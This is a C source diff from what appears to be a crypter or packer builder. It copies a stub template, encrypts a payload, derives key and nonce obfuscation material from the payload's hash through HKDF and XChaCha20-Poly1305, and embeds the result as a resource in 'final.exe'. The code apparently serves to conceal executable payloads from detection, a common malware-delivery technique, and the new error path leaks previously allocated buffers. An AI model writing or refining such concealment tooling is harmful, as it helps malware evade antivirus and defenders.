@@ -154,38 +154,63 @@ int main(int argc, char* argv[])
         return errorCode;
     }
     PrintMessage(hCon, "Copying stub template ended succesfully", 2, 0);
- 
+
+
     /* 
     Obfuscation of key and nonce
-    1) Calculating payload`s hash
-    2) chacha20 and obfuscated values init
-    3) encryption of key and nonce, so they are obfuscated
+    1) Compute SHA-256 of encrypted payload
+    2) Derive salt = first 16 bytes of that hash
+    3) HKDF-Extract & Expand → OKM[80]
+        OKM[0..31]   = obfuscation key
+        OKM[32..55]  = obfuscation nonce
+        OKM[56..79]  = meta-nonce for AEAD
+    4) ChaCha20-Poly1305(obf_key, meta_nonce) encrypts key & nonce
     */
 
-    uint8_t hash[SHA256HashSize];
     SHA256Context shaCTX;
+    HKDFContext hkdfCTX;
+    chacha20poly1305_ctx obfuscationCtx;
+    uint8_t hash[SHA256HashSize];
+    uint8_t salt[16];
+    uint8_t prk[USHAMaxHashSize];
+    uint8_t okm[80];
+    uint8_t metaNonce[24];
+    uint8_t *obfuscatedKey = (uint8_t *)malloc(32);
+    uint8_t *obfuscatedNonce = (uint8_t *)malloc(24);
 
+    // 1) hash = SHA256(encryptedPayload)
     SHA256Reset(&shaCTX);
     SHA256Input(&shaCTX, encryptedPayload, fileLen);
     SHA256Result(&shaCTX, hash);
 
-    chacha20poly1305_ctx obfuscationCtx;
-    xchacha20poly1305_init(&obfuscationCtx, hash, (uint8_t *)"obfuscation-nonce-12224");
+    // 2) salt = hash[0..15]
+    memcpy(salt, hash, 16);
 
-    uint8_t *obfuscatedKey = (uint8_t *)malloc(32);
-    uint8_t *obfuscatedNonce = (uint8_t *)malloc(24);
-    if (!obfuscatedKey || !obfuscatedNonce)
+    // 3) HKDF(salt, IKM=hash) → okm[80]
+    memset(&hkdfCTX, 0, sizeof(hkdfCTX));
+    int hkdf_r1 = hkdfReset(&hkdfCTX, SHA256, salt, 16);
+    int hkdf_r2 = hkdfInput(&hkdfCTX, hash, 32);
+    int hkdf_r3 = hkdfResult(&hkdfCTX, prk, (const uint8_t *)"obfuscation-context", (int)strlen("obfuscation-context"), okm, 80);
+    
+    char debugMsg[128];
+    snprintf(debugMsg, sizeof(debugMsg), "HKDF: reset=%d input=%d result=%d", hkdf_r1, hkdf_r2, hkdf_r3);
+    PrintMessage(hCon, debugMsg, 6, 0);
+    if (hkdf_r1 != 0 || hkdf_r2 != 0 || hkdf_r3 != 0)
     {
-        errorCode = PrintMessage(hCon, "Error: Memory allocation failed for obfuscation.", 4, ERROR_NOT_ENOUGH_MEMORY);
-        free(fileBuff);
-        free(encryptedPayload);
-        if (obfuscatedKey) free(obfuscatedKey);
-        if (obfuscatedNonce) free(obfuscatedNonce);
+        errorCode = PrintMessage(hCon, "Error: HKDF derivation failed.", 4, ERROR_INTERNAL_ERROR);
         return errorCode;
     }
 
+    // Split OKM into key, nonce, meta-nonce
+    memcpy(obfuscatedKey, okm, 32);
+    memcpy(obfuscatedNonce, okm + 32, 24);
+    memcpy(metaNonce, okm + 56, 24);
+
+    // 4) AEAD with (obfuscatedKey, metaNonce)
+    xchacha20poly1305_init(&obfuscationCtx, obfuscatedKey, metaNonce);
     chacha20poly1305_encrypt(&obfuscationCtx, key, obfuscatedKey, 32);
     chacha20poly1305_encrypt(&obfuscationCtx, nonce, obfuscatedNonce, 24);
+
 
     // Adding resouces (encrypted data, obfuscated key&nonce) to final.exe 
     PrintMessage(hCon, "Adding encrypted resource to final.exe... ", 7, 0);
